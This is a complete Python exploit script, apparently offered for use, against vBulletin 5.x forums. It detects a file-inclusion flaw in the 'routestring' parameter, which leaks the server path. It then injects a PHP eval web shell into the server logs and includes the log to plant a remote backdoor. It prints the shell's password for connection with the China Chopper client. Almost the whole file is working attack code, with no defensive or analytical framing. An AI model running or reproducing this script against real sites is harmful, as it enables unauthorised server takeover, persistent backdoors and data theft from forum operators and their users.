import requests
import sys
import re

url_in = sys.argv[1]
payload_url = url_in + "/index.php"
payload_header = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"}

def verify_vulnerablilty():
    payload_var = ".\\\\"
    payload = {"routestring":payload_var}
    verify_response = requests.get(payload_url, headers=payload_header, params=payload)
    result = verify_response.content
    if "Fatal error" in result:
        result = re.findall('required(.*?)\.\\\\', result, re.DOTALL)
        return result
    else:
        return 0


def creat_command_webshell(log_path):
    payload_init = "<?php @eval($_POST['1337g']);?>"
    payload = payload_url+payload_init
    requests.get(payload)
    payload_2 =  {"routestring":log_path}
    result = requests.get(payload_url,params=payload_2)
    if payload_init in result.content:
        print "webshell is uploaded, you can connect with chopper, and the password is 1337g."
        print payload_url + "?routestring=" + log_path
    else:
        print "try manually connect the shell and the password is 1337g."
        print payload_url + "?routestring=" + log_path



print "***************************************************** \n" \
       "****************   Coded By 1337g  ****************** \n" \
       "*          Vbulletin 5.X GET WEBSHELL EXP           * \n" \
       "***************************************************** \n"
v_v = verify_vulnerablilty()

if (v_v== 0):
    print("This host is not vulnerable")
    exit()
else:
    print("Vulnerability Exists : Here is the System Path :" + v_v)
    log_path = raw_input("Please Input the Log Path for Remote File Inclusion:")
    creat_command_webshell(log_path)
